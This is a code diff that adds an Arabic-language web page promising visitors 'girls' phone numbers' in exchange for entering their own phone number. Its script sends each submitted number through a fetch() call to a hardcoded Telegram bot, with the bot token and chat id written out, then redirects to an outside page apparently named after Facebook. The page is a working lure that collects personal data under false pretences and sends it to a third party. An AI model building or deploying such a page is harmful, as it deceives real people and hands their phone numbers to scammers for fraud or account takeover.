@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد رقم الهاتف</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ff7eb3, #ff758c, #ff6a7a);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 1.8em;
+            color: #333;
+        }
+
+        p {
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 70%;
+            padding: 12px 15px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #ff6a7a;
+            outline: none;
+        }
+
+        button {
+            background-color: #ff6a7a;
+            color: #fff;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #ff5470;
+        }
+
+        #confirmation {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #28a745;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>يرجى إدخال رقم هاتفك</h1>
+        <p> لتتوصل بارقام بنات </p>
+        <form id="phoneForm">
+            <label for="phone">رقم الهاتف</label><br>
+            <input type="tel" id="phone" name="phone" placeholder="مثال: 0666666666 / 0766666666" required><br>
+            <button type="submit">إرسال</button>
+        </form>
+        <p id="confirmation" class="hidden"></p>
+    </div>
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            // الحصول على الرقم المدخل
+            const phone = document.getElementById('phone').value;
+            
+            // تحقق أساسي من الرقم
+            if (phone.trim() === "" || !/^\d{10}$/.test(phone)) {
+                alert("يرجى إدخال رقم هاتف صالح!");
+                return;
+            }
+
+            // إرسال الرقم إلى Telegram
+            const botToken = "6698382596:AAEG8HZdb0kSF4V3ULvLZhQPaHtlsySrmhg"; // ضع توكن البوت الخاص بك هنا
+            const chatId = "1864213005"; // ضع معرف المحادثة الخاص بك هنا
+            const message = `رقم الهاتف المرسل: ${phone}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramUrl)
+                .then(response => {
+                    if (response.ok) {
+                        // إعادة التوجيه إلى Google
+                        window.location.href = "https://gofollowers.netlify.app/sca/facebook.html";
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الرقم. حاول مرة أخرى.");
+                    }
+                })
+                .catch(error => {
+                    console.error("خطأ:", error);
+                    alert("تعذر إرسال الرقم. تحقق من الاتصال.");
+                });
+        });
+    </script>
+</body>
+</html>
